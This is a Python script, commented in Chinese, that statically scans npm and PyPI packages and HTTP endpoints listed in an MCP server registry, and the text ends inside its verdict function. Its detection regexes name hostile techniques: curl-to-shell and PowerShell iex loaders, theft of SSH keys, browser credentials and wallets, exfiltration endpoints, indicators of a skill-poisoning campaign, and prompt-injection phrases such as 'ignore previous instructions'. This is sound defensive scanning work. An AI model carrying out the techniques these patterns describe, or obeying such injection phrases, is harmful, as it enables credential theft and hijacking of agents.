#!/usr/bin/env python3
"""静态审核注册表里未 verified 的条目 —— 不安装、不运行任何第三方包。

只读公开元数据（npm / PyPI / osv.dev / GitHub），把发布的压缩包下载到内存里逐文件扫描
（不落盘、不解压到磁盘、不执行），远程 http 端点只发不带凭据的 GET 看连通性与 TLS。

  python3 scripts/review_static.py                  # 审核全部 verified: false 及之前审过的条目
  python3 scripts/review_static.py --name a --name b  # 只审几条（结果并入当天的 JSON）
  python3 scripts/review_static.py --apply          # 按当天 JSON 改写清单（verified / security / version）
  python3 scripts/gen_registry.py                   # 改完清单再重新生成索引

结果：docs/review-<日期>.json（逐条明细）与 docs/review-<日期>.md（中文汇总表）。
人工复核结论放 docs/review-<日期>-manual.json：
  {"<name>": {"dismiss": ["<自动发现的文字前缀>", …], "verdict": "warn|block", "reason": "…"}}
dismiss 撤销读过代码、确认无害的自动发现（明细里标 dismissed 保留）；verdict 只在需要定拒绝 / 警告时写。
"""
from __future__ import annotations

import argparse
import base64
import concurrent.futures as cf
import datetime as dt
import hashlib
import io
import json
import re
import socket
import ssl
import sys
import tarfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
from gen_registry import SERVERS_DIR, _require_yaml, _runtime_package  # noqa: E402

TODAY = dt.date.today().isoformat()
_pop = ROOT / "registry" / "popularity.json"
POPULARITY = json.loads(_pop.read_text(encoding="utf-8")) if _pop.exists() else {}
UA = "totalclaw-mcp-review/1.0 (static review, no install)"
MARK = "静态审核"            # 写进清单头注释；带这个标记的条目重跑时也会再审
STALE_DAYS = 730             # 最近一次发布超过 2 年 → 警告
LOW_DOWNLOADS = 20           # 周下载低于此数 → 警告（每天不到 3 次，基本只剩镜像 / 爬虫流量）
MAX_ARCHIVE = 120 * 2**20    # 压缩包上限，超过不扫，记警告
MAX_TEXT = 8 * 2**20         # 单文件扫描上限
WORKERS = 6

# ── 网络 ──────────────────────────────────────────────────────────────────────


_DIRECT = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def http(url, method="GET", body=None, headers=None, timeout=30, limit=None, read=True, direct=False):
    """返回 (status, final_url, headers, data)。网络异常 / 429 / 5xx 重试一次；HTTP 错误码照常返回。"""
    hdrs = {"User-Agent": UA, **(headers or {})}
    for attempt in (0, 1):
        try:
            req = urllib.request.Request(url, data=body, method=method, headers=hdrs)
            try:
                resp = (_DIRECT.open if direct else urllib.request.urlopen)(req, timeout=timeout)
            except urllib.error.HTTPError as e:
                resp = e
            with resp:
                status = resp.status if hasattr(resp, "status") else resp.code
                data = b""
                if read:
                    data = resp.read(limit + 1) if limit else resp.read()
                    if limit and len(data) > limit:
                        raise ValueError(f"响应超过 {limit} 字节")
                if status in (429, 500, 502, 503, 504) and attempt == 0:
                    time.sleep(5 if status == 429 else 2)
                    continue
                return status, resp.geturl(), dict(resp.headers), data
        except (urllib.error.URLError, socket.timeout, ConnectionError, ssl.SSLError, TimeoutError):
            if attempt:
                raise
            time.sleep(2)
    raise RuntimeError("unreachable")


def get_json(url, **kw):
    status, _, _, data = http(url, **kw)
    if status != 200:
        return status, None
    return status, json.loads(data)


# ── 压缩包扫描 ────────────────────────────────────────────────────────────────

# (标签, 正则)。命中只是「需要人看」，由人工复核决定是否真有问题。
HIGH_PATTERNS = [
    ("下载即执行(curl|sh)", r"(?:curl|wget)\b[^\n|;&]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b"),
    ("PowerShell 下载即执行", r"(?i)(?:iwr|irm|invoke-webrequest|invoke-restmethod|downloadstring)[^\n]{0,200}\|\s*iex\b"
                            r"|\biex\s*\(\s*\(?\s*new-object\s+net\.webclient"),
    ("读取 SSH 私钥", r"\.ssh[\\/]+id_(?:rsa|dsa|ecdsa|ed25519)\b|['\"]id_(?:rsa|ed25519)['\"]"),
    ("浏览器凭据 / Cookie 库", r"Login Data|key4\.db|logins\.json|Local Storage[\\/]+leveldb|['\"/\\\\]Cookies['\"]"),
    ("加密钱包", r"wallet\.dat|nkbihfbeogaeaoehlefnkodbefgpgknn|bfnaelmomeimhlpmgjnjophhpkkoljpa"
              r"|\.ethereum[\\/]keystore|solana[\\/]id\.json|exodus\.wallet"),
    ("可疑外传端点", r"discord(?:app)?\.com/api/webhooks|webhook\.site|pipedream\.net|requestbin|\boast\.(?:fun|pro|live|site|online|me)\b"
                 r"|interact\.sh|burpcollaborator|transfer\.sh|pastebin\.com/raw|hookbin\.com|trycloudflare\.com|ngrok(?:-free)?\.(?:io|app)"
                 r"|\bbore\.pub\b|serveo\.net|\bloca\.lt\b|localtunnel\.me|pinggy\.(?:io|link)|localhost\.run|\blhr\.life\b"),
    ("解码进 shell", r"base64\s+(?:-d|-D|--decode)\b[^\n]{0,80}\|\s*(?:sudo\s+)?(?:ba|z)?sh\b"),
    # 2026-11 ClawHavoc 技能投毒的已知特征（假前置安装、投放 IP / 域名）
    ("已知投毒特征", r"91\.92\.242\.30|app-distribution\.net|setup-service\.com|openclawcli\.|OpenClaw(?:Driver|CLI|Provider)\b"),
    ("提示注入话术", r"(?i)ignore (?:all |any )?(?:previous|prior|above|earlier) (?:instructions|prompts)"
                 r"|do not (?:tell|inform|mention (?:this )?to|reveal (?:this )?to) the user|without (?:telling|informing|notifying) the user"
                 r"|<IMPORTANT>|忽略(?:之前|以上|前面)的?(?:所有)?(?:指令|提示)|不要告诉用户"),
    ("整体外传环境变量", r"JSON\.stringify\(\s*process\.env\s*\)|json\.dumps\(\s*dict\(\s*os\.environ\s*\)\s*\)"),
    ("解码后执行", r"\beval\(\s*(?:atob|Buffer\.from|unescape)\(|new Function\(\s*(?:atob|Buffer\.from)\("
               r"|\bexec\(\s*(?:base64\.b64decode|zlib\.decompress|marshal\.loads|bytes\.fromhex|codecs\.decode)"
               r"|\bexec\(\s*__import__\(\s*['\"](?:base64|zlib|marshal)"),
    ("硬编码公网 IP 地址", r"https?://(?!(?:127\.|0\.0\.0\.0|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.))\d{1,3}(?:\.\d{1,3}){3}\b"),
    ("加密 / 混淆运行时", r"pyarmor_runtime|__pyarmor__|PyArmor"),
]
HIGH_RES = [(label, re.compile(rx)) for label, rx in HIGH_PATTERNS]
OBF_RE = re.compile(r"\b_0x[0-9a-f]{4,6}\b")
SETUP_RISK_RE = re.compile(r"os\.system|subprocess|urlopen|urllib\.request|requests\.(?:get|post)|socket\.|\bexec\(|\beval\(")
SKIP_EXT = {".map", ".md", ".markdown", ".rst", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".webp",
            ".woff", ".woff2", ".ttf", ".eot", ".otf", ".pdf", ".mp3", ".mp4", ".wav", ".lock", ".d.ts",
            ".txt", ".yml", ".yaml"}
# 说明文档与容器 / CI 配置：npx / uvx 不会执行它们，里面的「curl … | sh」都是安装说明
SKIP_NAMES = {"metadata", "pkg-info", "dockerfile"}
BINARY_EXT = {".node", ".exe", ".dll", ".so", ".dylib"}
BINARY_MAGIC = (b"\x7fELF", b"MZ", b"\xcf\xfa\xed\xfe", b"\xce\xfa\xed\xfe", b"\xfe\xed\xfa", b"\xca\xfe\xba\xbe")
LICENSE_TEXT = [
    (r"Apache License,?\s+Version 2\.0", "Apache-2.0"),
    (r"GNU AFFERO GENERAL PUBLIC LICENSE", "AGPL-3.0"),
    (r"GNU LESSER GENERAL PUBLIC LICENSE", "LGPL-3.0"),
    (r"GNU GENERAL PUBLIC LICENSE\s+Version 3", "GPL-3.0"),
    (r"GNU GENERAL PUBLIC LICENSE\s+Version 2", "GPL-2.0"),
    (r"Mozilla Public License,? (?:Version )?2\.0", "MPL-2.0"),
    (r"\bISC License\b", "ISC"),
    (r"This is free and unencumbered software", "Unlicense"),
    (r"Redistribution and use in source and binary forms.{0,900}Neither the name", "BSD-3-Clause"),
    (r"Redistribution and use in source and binary forms", "BSD-2-Clause"),
    (r"Permission is hereby granted, free of charge", "MIT"),
    (r"\bMIT License\b", "MIT"),
]


def license_from_text(text: str) -> str:
    # 商业许可正文里也可能引用 MIT 等字样，先看标题
    if re.search(r"(?i)commercial license|proprietary|商业授权|商业许可", text[:400]):
        return "Proprietary"
    for rx, name in LICENSE_TEXT:
        if re.search(rx, text, re.S | re.I):
            return name
    return ""


def _members(blob: bytes, kind: str):
    """逐个产出 (路径, 读内容的函数, 大小)。只在内存里读，不写磁盘。"""
    if kind == "zip":
        zf = zipfile.ZipFile(io.BytesIO(blob))
        for info in zf.infolist():
            if not info.is_dir():
                yield info.filename, (lambda n=-1, i=info: zf.open(i).read(n)), info.file_size
    else:
        tf = tarfile.open(fileobj=io.BytesIO(blob), mode="r:*")
        for m in tf:
            if m.isfile():
                yield m.name, (lambda n=-1, m=m: tf.extractfile(m).read(n)), m.size


def scan_archive(blob: bytes, kind: str) -> dict:
    out = {"files": 0, "findings": [], "binaries": [], "license_files": "", "setup_py": "", "pth": [],
           "pyproject_backend_path": False, "package_json": None, "skipped_large": []}
    for path, read, size in _members(blob, kind):
        out["files"] += 1
        low = path.lower()
        base = low.rsplit("/", 1)[-1]
        ext = "." + base.rsplit(".", 1)[-1] if "." in base else ""
        if low.endswith(".d.ts"):
            ext = ".d.ts"
        if "/.mypy_cache/" in path or "/__pycache__/" in path:
            continue
        head4 = read(4)
        if ext in BINARY_EXT or (head4.startswith(BINARY_MAGIC) and ext not in (".js", ".py", ".json", ".txt")):
            out["binaries"].append(path)
            continue
        if size > MAX_TEXT:
            out["skipped_large"].append(path)
            continue
        data = read()
        text = data.decode("utf-8", "replace")
        depth = path.count("/")
        if base.startswith(("license", "licence", "copying")) and depth <= 1 and not out["license_files"]:
            out["license_files"] = license_from_text(text) or "?"
        if base == "package.json" and depth == 1 and out["package_json"] is None:
            try:
                out["package_json"] = json.loads(text)
            except ValueError:
                out["package_json"] = {}
        if base == "setup.py" and depth <= 1:
            out["setup_py"] = text
        if base == "pyproject.toml" and depth <= 1 and re.search(r"^\s*backend-path\s*=", text, re.M):
            out["pyproject_backend_path"] = True
        if ext == ".pth":
            imports = [ln for ln in text.splitlines() if ln.lstrip().startswith("import")]
            if imports:
                out["pth"].append(f"{path}: {imports[0][:160]}")
        if ext in SKIP_EXT or base in SKIP_NAMES:
            continue
        for label, rx in HIGH_RES:
            for m in list(rx.finditer(text))[:3]:
                s = max(0, m.start() - 70)
                snippet = text[s:m.end() + 70].replace("\n", " ")
                out["findings"].append({"label": label, "file": path, "snippet": snippet[:220]})
        n_obf = len(OBF_RE.findall(text))
        if n_obf > 100:
            out["findings"].append({"label": "混淆器特征(_0x 标识符)", "file": path, "snippet": f"{n_obf} 处 _0x…"})
    return out


# ── 仓库 / 许可证辅助 ─────────────────────────────────────────────────────────

GH_RE = re.compile(r"github\.com[/:]+([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+?)(?:\.git)?(?:[/#?]|$)")


def gh_slug(url) -> str:
    m = GH_RE.search(str(url or ""))
    if not m or m.group(1).lower() in ("orgs", "sponsors", "users", "settings", "apps", "marketplace"):
        return ""
    return f"{m.group(1)}/{m.group(2)}"


_gh_cache: dict = {}
_gh_lock = threading.Lock()


def gh_canonical(slug: str):
    """(状态, 规范 owner/repo)。改过名的仓库 github 会 301 到新地址。"""
    key = slug.lower()
    with _gh_lock:
        if key in _gh_cache:
            return _gh_cache[key]
    try:
        status, final, _, _ = http(f"https://github.com/{slug}", method="HEAD", read=False, timeout=20)
        res = (status, gh_slug(final) or slug)
    except Exception as e:  # noqa: BLE001
        res = (f"ERR {type(e).__name__}", slug)
    with _gh_lock:
        _gh_cache[key] = res
    return res


def raw_github(slug: str, path: str) -> str | None:
    try:
        status, _, _, data = http(f"https://raw.githubusercontent.com/{slug}/HEAD/{path}", timeout=20, limit=2 * 2**20)
    except Exception:  # noqa: BLE001
        return None
    return data.decode("utf-8", "replace") if status == 200 else None


def repo_claims_package(slug: str, pkg: str, eco: str, subdir: str = "") -> str:
    """源码仓库是否认领这个包名（防冒名）：先看清单文件里的包名，再看 README 有没有提到。"""
    pre = subdir.strip("/") + "/" if subdir else ""
    norm = lambda s: re.sub(r"[-_.]+", "-", s.lower())  # noqa: E731
    if eco == "npm":
        for p in ([pre + "package.json"] if pre else []) + ["package.json"]:
            t = raw_github(slug, p)
            if t:
                try:
                    if json.loads(t).get("name") == pkg:
                        return f"仓库 {p} 声明同名包"
                except ValueError:
                    pass
    else:
        for p in ([pre + "pyproject.toml", pre + "setup.py"] if pre else []) + ["pyproject.toml", "setup.py", "setup.cfg"]:
            t = raw_github(slug, p)
            if t:
                for m in re.finditer(r"""name\s*[=:]\s*['"]?([A-Za-z0-9_.\-\[\]]+)""", t):
                    if norm(m.group(1)) == norm(pkg):
                        return f"仓库 {p} 声明同名包"
    for p in ([pre + "README.md"] if pre else []) + ["README.md", "readme.md", "README.rst"]:
        t = raw_github(slug, p)
        if t and (pkg.lower() in t.lower() or norm(pkg) in norm(t)):
            return f"仓库 {p} 提到包名"
    return ""


CLASSIFIER_LICENSE = {
    "MIT License": "MIT", "Apache Software License": "Apache-2.0", "BSD License": "BSD",
    "GNU General Public License v3 (GPLv3)": "GPL-3.0", "GNU Affero General Public License v3": "AGPL-3.0",
    "Mozilla Public License 2.0 (MPL 2.0)": "MPL-2.0", "ISC License (ISCL)": "ISC",
    "GNU Lesser General Public License v3 (LGPLv3)": "LGPL-3.0", "The Unlicense (Unlicense)": "Unlicense",
}
NON_OPEN = re.compile(r"(?i)^(unlicensed|proprietary|commercial|all rights reserved|see license in|none|other/proprietary license)")


def norm_license(s) -> str:
    if isinstance(s, dict):
        s = s.get("type") or ""
    if isinstance(s, list):
        s = " OR ".join(str(x.get("type") if isinstance(x, dict) else x) for x in s)
    s = str(s or "").strip()
    if not s or s.upper() in ("UNKNOWN", "N/A"):
        return ""
    if len(s) <= 60 and "\n" not in s:
        return s
    return license_from_text(s) or "（全文，未识别）"


def days_since(ts: str):
    if not ts:
        return None
    t = dt.datetime.fromisoformat(ts.replace("Z", "+00:00"))
    if t.tzinfo is None:
        t = t.replace(tzinfo=dt.timezone.utc)
    return (dt.datetime.now(dt.timezone.utc) - t).days


# ── 单条审核 ──────────────────────────────────────────────────────────────────


def _issue(res, level, text, derived=False):
    item = {"level": level, "text": " ".join(str(text).split())}
    if derived:  # finalize() 推出来的，--report 重算前先去掉
        item["derived"] = True
    res["issues"].append(item)


def split_npm(spec: str):
    body = spec[1:] if spec.startswith("@") else spec
    name, ver = body.rsplit("@", 1)
    return (("@" + name) if spec.startswith("@") else name), ver


def split_pypi(spec: str):
    name, ver = spec.split("==", 1)
    return re.sub(r"\[.*\]$", "", name.strip()), ver.strip()


def review_npm(res):
    name, ver = split_npm(res["package"])
    res.update(pkg_name=name, pkg_version=ver, ecosystem="npm")
    status, doc = get_json(f"https://registry.npmjs.org/{name.replace('/', '%2f')}", timeout=60)
    if status == 404 or (doc and not doc.get("versions")):
        return _issue(res, "block", "npm 上不存在该包（或已整包下架）")
    if doc is None:
        return _issue(res, "warn", f"npm 元数据取不到（HTTP {status}）")
    v = doc["versions"].get(ver)
    if not v:
        return _issue(res, "block", f"钉的版本 {ver} 在 npm 上不存在（最新 {doc.get('dist-tags', {}).get('latest')}）")
    if v.get("deprecated"):
        _issue(res, "warn", f"该版本已被作者标记弃用：{str(v['deprecated'])[:160]}")
    times = doc.get("time") or {}
    latest = (doc.get("dist-tags") or {}).get("latest") or ver
    res["published"] = times.get(ver, "")[:10]
    res["latest"] = latest
    res["latest_published"] = times.get(latest, "")[:10]
    res["publisher"] = (v.get("_npmUser") or {}).get("name") or ",".join(m.get("name", "") for m in v.get("maintainers") or [])
    repo = v.get("repository") or doc.get("repository") or {}
    res["meta_repo_url"] = repo.get("url", "") if isinstance(repo, dict) else str(repo)
    res["meta_repo_dir"] = repo.get("directory", "") if isinstance(repo, dict) else ""
    res["meta_homepage"] = v.get("homepage") or doc.get("homepage") or ""
    res["license_meta"] = norm_license(v.get("license") or doc.get("license"))
    scripts = v.get("scripts") or {}
    res["install_scripts"] = {k: scripts[k] for k in ("preinstall", "install", "postinstall") if k in scripts}
    if v.get("gypfile") and "install" not in scripts:
        res["install_scripts"]["install"] = "node-gyp rebuild（包内有 binding.gyp，npm 会自动编译）"
    dist = v.get("dist") or {}
    if dist.get("unpackedSize", 0) > MAX_ARCHIVE * 3:
        return _issue(res, "warn", f"包解压后 {dist['unpackedSize'] // 2**20} MB，过大未扫描")
    status, _, _, blob = http(dist["tarball"], timeout=120, limit=MAX_ARCHIVE)
    if status != 200:
        return _issue(res, "warn", f"压缩包下载失败（HTTP {status}），未扫描")
    integ = dist.get("integrity", "")
    if integ.startswith("sha512-") and base64.b64encode(hashlib.sha512(blob).digest()).decode() != integ[7:]:
        return _issue(res, "block", "压缩包 sha512 与注册中心记录不符")
    res["scan"] = scan_archive(blob, "tar")
    if not res["install_scripts"] and res["scan"]["package_json"]:
        pj = res["scan"]["package_json"].get("scripts") or {}
        res["install_scripts"] = {k: pj[k] for k in ("preinstall", "install", "postinstall") if k in pj}


def review_pypi(res):
    name, ver = split_pypi(res["package"])
    res.update(pkg_name=name, pkg_version=ver, ecosystem="PyPI")
    status, doc = get_json(f"https://pypi.org/pypi/{name}/json", timeout=60)
    if status == 404:
        return _issue(res, "block", "PyPI 上不存在该包")
    if doc is None:
        return _issue(res, "warn", f"PyPI 元数据取不到（HTTP {status}）")
    status, vdoc = get_json(f"https://pypi.org/pypi/{name}/{ver}/json", timeout=60)
    if status == 404 or not vdoc:
        return _issue(res, "block", f"钉的版本 {ver} 在 PyPI 上不存在（最新 {doc['info'].get('version')}）")
    files = vdoc.get("urls") or []
    if not files:
        return _issue(res, "block", f"版本 {ver} 没有可下载的发布文件")
    if all(f.get("yanked") for f in files):
        return _issue(res, "block", f"版本 {ver} 已被撤回（yanked）：{files[0].get('yanked_reason') or ''}")
    info = vdoc["info"]
    latest = doc["info"].get("version") or ver
    res["published"] = min(f["upload_time_iso_8601"] for f in files)[:10]
    res["latest"] = latest
    lf = (doc.get("releases") or {}).get(latest) or []
    res["latest_published"] = (min(f["upload_time_iso_8601"] for f in lf)[:10]) if lf else res["published"]
    res["publisher"] = info.get("author") or info.get("maintainer") or info.get("author_email") or ""
    urls = list((info.get("project_urls") or {}).values()) + [info.get("home_page"), info.get("download_url")]
    res["meta_repo_url"] = next((u for u in urls if gh_slug(u)), "") or next((u for u in urls if u), "")
    res["meta_homepage"] = info.get("home_page") or ""
    lic = norm_license(info.get("license_expression")) or norm_license(info.get("license"))
    if not lic:
        cls = [c.split(" :: ")[-1] for c in info.get("classifiers") or [] if c.startswith("License ::")]
        lic = next((CLASSIFIER_LICENSE.get(c, c) for c in cls if c != "OSI Approved"), "")
    res["license_meta"] = lic
    res["install_scripts"] = {}
    scans = []
    wheels = [f for f in files if f["packagetype"] == "bdist_wheel"]
    wheel = next((f for f in wheels if "none-any" in f["filename"]), wheels[0] if wheels else None)
    sdist = next((f for f in files if f["packagetype"] == "sdist"), None)
    res["has_wheel"] = bool(wheel)
    for f in (wheel, sdist):
        if not f:
            continue
        if f["size"] > MAX_ARCHIVE:
            _issue(res, "warn", f"{f['filename']} 过大（{f['size'] // 2**20} MB）未扫描")
            continue
        status, _, _, blob = http(f["url"], timeout=120, limit=MAX_ARCHIVE)
        if status != 200:
            _issue(res, "warn", f"{f['filename']} 下载失败（HTTP {status}），未扫描")
            continue
        if hashlib.sha256(blob).hexdigest() != f["digests"]["sha256"]:
            return _issue(res, "block", f"{f['filename']} sha256 与 PyPI 记录不符")
        kind = "zip" if f["filename"].endswith((".whl", ".zip")) else "tar"
        scans.append(scan_archive(blob, kind))
    if not scans:
        return
    merged = scans[0]
    for s in scans[1:]:
        merged["files"] += s["files"]
        for k in ("findings", "binaries", "pth", "skipped_large"):
            merged[k] += s[k]
        merged["license_files"] = merged["license_files"] or s["license_files"]
        merged["setup_py"] = merged["setup_py"] or s["setup_py"]
        merged["pyproject_backend_path"] |= s["pyproject_backend_path"]
    res["scan"] = merged
    sp = merged.get("setup_py") or ""
    if sp and SETUP_RISK_RE.search(sp):
        hits = sorted(set(m.group(0) for m in SETUP_RISK_RE.finditer(sp)))
        res["install_scripts"]["setup.py"] = "setup.py 含 " + ", ".join(hits)
    if merged["pyproject_backend_path"]:
        res["install_scripts"]["pyproject"] = "pyproject.toml 使用仓内自定义构建后端（backend-path）"


def review_http(res, manifest):
    url = res["package"]
    res["ecosystem"] = "http"
    host = urllib.parse.urlsplit(url).hostname or ""
    res["host"] = host
    if not url.startswith("https://"):
        return _issue(res, "block", "端点不是 HTTPS")
    hdrs = {"Accept": "application/json, text/event-stream"}
    try:
        try:
            status, final, _, _ = http(url, timeout=20, read=False, headers=hdrs)
        except Exception:  # noqa: BLE001
            status, final, _, _ = http(url, timeout=20, read=False, headers=hdrs, direct=True)
    except urllib.error.URLError as e:
        reason = e.reason
        if isinstance(reason, ssl.SSLError) or "CERTIFICATE" in str(reason).upper():
            return _issue(res, "block", f"TLS 证书校验失败：{reason}")
        return _issue(res, *_unreachable(host, reason))
    except Exception as e:  # noqa: BLE001
        return _issue(res, *_unreachable(host, f"{type(e).__name__} {e}"))
    res["http_status"] = status
    res["final_url"] = final
    if not final.startswith("https://"):
        _issue(res, "block", f"端点被重定向到非 HTTPS 地址：{final}")
    elif status in (404, 410):
        _issue(res, "warn", f"端点返回 {status}，地址可能已变更")
    elif status >= 500:
        _issue(res, "warn", f"端点返回 {status}（服务端错误）")
    # 域名与厂商：主页 / 仓库所在的可注册域名或 GitHub 组织名应能对上
    reg = lambda h: ".".join(h.split(".")[-3:]) if re.search(r"\.(com|net|org|gov|edu)\.[a-z]{2}$", h) else ".".join(h.split(".")[-2:])  # noqa: E731
    vendor_hosts = set()
    owners = set()
    for u in (manifest.get("homepage"), manifest.get("repository")):
        if not u:
            continue
        h = urllib.parse.urlsplit(str(u)).hostname or ""
        if gh_slug(u):
            owners.add(gh_slug(u).split("/")[0].lower())
        elif h:
            vendor_hosts.add(reg(h))
    label = reg(host).split(".")[0].replace("-", "")
    ok = reg(host) in vendor_hosts or any(o.replace("-", "") in label or label in o.replace("-", "") for o in owners if len(o) > 2)
    if not ok:  # 组织名和域名不像，就看条目引用的仓库 README 里有没有写这个端点
        slug = gh_slug(manifest.get("repository")) or gh_slug(manifest.get("homepage"))
        readme = (raw_github(slug, "README.md") or "") if slug else ""
        ok = host.lower() in readme.lower()
        res["vendor_evidence"] = f"{slug} README 写明 {host}" if ok else ""
    res["vendor_match"] = ok
    if not ok:
        _issue(res, "warn", f"端点域名 {host} 与主页 / 仓库（{manifest.get('homepage')}）对不上，需人工核对")


def _unreachable(host, reason):
    # 走代理时 DNS 在代理那边解析，失败只表现为隧道错误；本机再查一次才分得清「域名不存在」
    try:
        socket.getaddrinfo(host, 443)
    except socket.gaierror:
        return "block", f"域名无法解析：{host}"
    return "warn", f"端点连不上：{reason}"


def review_one(entry) -> dict:
    manifest = entry["manifest"]
    rt = manifest["runtimes"][0]
    kind = rt.get("launcher") if rt["type"] == "stdio" else "http"
    res = {"name": manifest["name"], "path": entry["path"], "kind": kind,
           "package": _runtime_package(rt) if kind != "http" else rt["url"],
           "manifest_license": str(manifest.get("license") or ""), "manifest_homepage": manifest.get("homepage") or "",
           "manifest_repository": manifest.get("repository") or "", "issues": []}
    try:
        if len(manifest["runtimes"]) != 1:
            _issue(res, "warn", "条目有多个运行时，本脚本只审第一个")
        if kind == "npx":
            review_npm(res)
        elif kind == "uvx":
            review_pypi(res)
        elif kind == "http":
            review_http(res, manifest)
        else:
            _issue(res, "warn", f"启动方式 {kind} 不在本次静态审核范围")
    except Exception as e:  # noqa: BLE001
        _issue(res, "warn", f"审核过程出错：{type(e).__name__}: {e}")
    return res


# ── 汇总规则 ──────────────────────────────────────────────────────────────────


def osv_batch(results):
    pkgs = [r for r in results if r.get("ecosystem") in ("npm", "PyPI") and r.get("pkg_version")
            and not any(i["level"] == "block" for i in r["issues"])]
    for i in range(0, len(pkgs), 500):
        chunk = pkgs[i:i + 500]
        q = {"queries": [{"package": {"name": r["pkg_name"], "ecosystem": r["ecosystem"]}, "version": r["pkg_version"]}
                         for r in chunk]}
        _, data = get_json("https://api.osv.dev/v1/querybatch", method="POST", body=json.dumps(q).encode(),
                           headers={"Content-Type": "application/json"}, timeout=120)
        for r, item in zip(chunk, (data or {}).get("results") or []):
            r["osv_ids"] = [v["id"] for v in item.get("vulns") or []]
    ids = sorted({i for r in pkgs for i in r.get("osv_ids") or []})
    detail = {}

    def one(vid):
        _, d = get_json(f"https://api.osv.dev/v1/vulns/{vid}", timeout=60)
        return vid, d or {}

    with cf.ThreadPoolExecutor(WORKERS) as ex:
        for vid, d in ex.map(one, ids):
            sev = ((d.get("database_specific") or {}).get("severity") or "").upper()
            if vid.startswith("MAL-"):
                sev = "MALICIOUS"
            detail[vid] = {"severity": sev or "UNKNOWN", "summary": (d.get("summary") or d.get("details") or "")[:140]}
    for r in pkgs:
        r["osv"] = [{"id": i, **detail.get(i, {"severity": "UNKNOWN", "summary": ""})} for i in r.get("osv_ids") or []]
        r.pop("osv_ids", None)


def downloads(r):
    try:
        if r["ecosystem"] == "npm":
            _, d = get_json(f"https://api.npmjs.org/downloads/point/last-week/{r['pkg_name']}", timeout=30)
            r["downloads_weekly"] = (d or {}).get("downloads")
        elif r["ecosystem"] == "PyPI":
            _, d = get_json(f"https://pypistats.org/api/packages/{r['pkg_name'].lower()}/recent", timeout=30)
            r["downloads_weekly"] = ((d or {}).get("data") or {}).get("last_week")
    except Exception:  # noqa: BLE001
        r["downloads_weekly"] = None
    if r.get("downloads_weekly") is None:  # pypistats 限流时退回 popularity.json（10-27 采集）
        r["downloads_weekly"] = (POPULARITY.get(r["name"]) or {}).get("downloads_weekly")


def repo_checks(r):
    """仓库存在、条目仓库与包元数据仓库一致、仓库认领这个包名。"""
    if r.get("ecosystem") not in ("npm", "PyPI") or any(i["level"] == "block" for i in r["issues"]):
        return
    meta = gh_slug(r.get("meta_repo_url")) or gh_slug(r.get("meta_homepage"))
    mani = gh_slug(r["manifest_repository"]) or gh_slug(r["manifest_homepage"])
    canon = {}
    for slug in {s for s in (meta, mani) if s}:
        st, c = gh_canonical(slug)
        canon[slug] = c
        if st != 200:
            _issue(r, "warn", f"源码仓库 github.com/{slug} 访问不到（{st}）")
    r["repo_meta"] = canon.get(meta, meta)
    r["repo_manifest"] = canon.get(mani, mani)
    if meta and mani and canon[meta].lower() != canon[mani].lower() \
            and canon[meta].split("/")[0].lower() != canon[mani].split("/")[0].lower():
        _issue(r, "warn", f"条目写的仓库 {canon[mani]} 与包元数据里的仓库 {canon[meta]} 不一致")
    target = canon.get(meta) or canon.get(mani)
    if not target:
        other = r.get("meta_repo_url") or ""
        _issue(r, "warn", "找不到 GitHub 源码仓库，无法核对包出自哪里" + (f"（元数据写的是 {other}）" if other else ""))
        return
    r["repo_source"] = "包元数据" if meta else "条目（包元数据没写仓库）"
    claim = repo_claims_package(target, r["pkg_name"], r["ecosystem"], r.get("meta_repo_dir", ""))
    r["repo_claim"] = claim
    if not claim:
        _issue(r, "warn", f"仓库 {target} 的清单文件和 README 里都找不到包名 {r['pkg_name']}，无法确认包出自此仓库")
    if not r.get("license_meta") and not r.get("manifest_license") and not (r.get("scan") or {}).get("license_files"):
        for p in ("LICENSE", "LICENSE.md", "LICENSE.txt"):
            t = raw_github(target, p)
            if t:
                r["license_repo"] = license_from_text(t) or "?"
                break


def finalize(r, manual):
    if r.get("ecosystem") in ("npm", "PyPI") and not any(i["level"] == "block" for i in r["issues"]):
        file_lic = ((r.get("scan") or {}).get("license_files") or "").strip("?")
        lic = r.get("license_meta") or file_lic or r.get("license_repo", "").strip("?")
        if lic.upper().startswith("SEE LICENSE IN") and file_lic:
            lic = file_lic
        r["license_found"] = lic
        if not lic and not r["manifest_license"]:
            _issue(r, "warn", "没有找到开源许可证声明", True)
        elif lic and NON_OPEN.search(lic):
            _issue(r, "warn", f"许可证不是开源许可证：{lic}", True)
        for k, cmd in (r.get("install_scripts") or {}).items():
            _issue(r, "warn", f"有安装期执行的脚本 {k}: {str(cmd)[:120]}", True)
        sc = r.get("scan") or {}
        for f in sc.get("findings") or []:
            _issue(r, "warn", f"代码命中「{f['label']}」：{f['file']}", True)
        if sc.get("pth"):
            _issue(r, "warn", f"带启动即执行的 .pth：{sc['pth'][0]}", True)
        if sc.get("binaries"):
            _issue(r, "warn", f"包内含预编译二进制（静态看不到行为）：{', '.join(sc['binaries'][:3])}"
                              + (f" 等 {len(sc['binaries'])} 个" if len(sc["binaries"]) > 3 else ""), True)
        for v in r.get("osv") or []:
            lvl = "block" if v["severity"] in ("HIGH", "CRITICAL", "MALICIOUS") else "warn"
            _issue(r, lvl, f"osv 已知漏洞 {v['id']}（{v['severity']}）：{v['summary']}", True)
        age = days_since(r.get("latest_published"))
        if age is not None and age > STALE_DAYS:
            _issue(r, "warn", f"最近一次发布在 {r['latest_published']}，已超过 2 年没更新", True)
        dl = r.get("downloads_weekly")
        if dl is not None and dl < LOW_DOWNLOADS:
            _issue(r, "warn", f"周下载量很低（{dl}）", True)
    worst = lambda items: "block" if any(i["level"] == "block" for i in items) else "warn" if items else "allow"  # noqa: E731
    r["auto_verdict"] = worst(r["issues"])
    # 人工复核：dismiss 按前缀撤销已读过代码、确认无害的自动发现；verdict 只用来定拒绝 / 警告
    m = manual.get(r["name"]) or {}
    for i in r["issues"]:
        i.pop("dismissed", None)
        if any(i["text"].startswith(pre) for pre in m.get("dismiss") or []):
            i["dismissed"] = True
    live = [i for i in r["issues"] if not i.get("dismissed")]
    r["manual"] = m or None
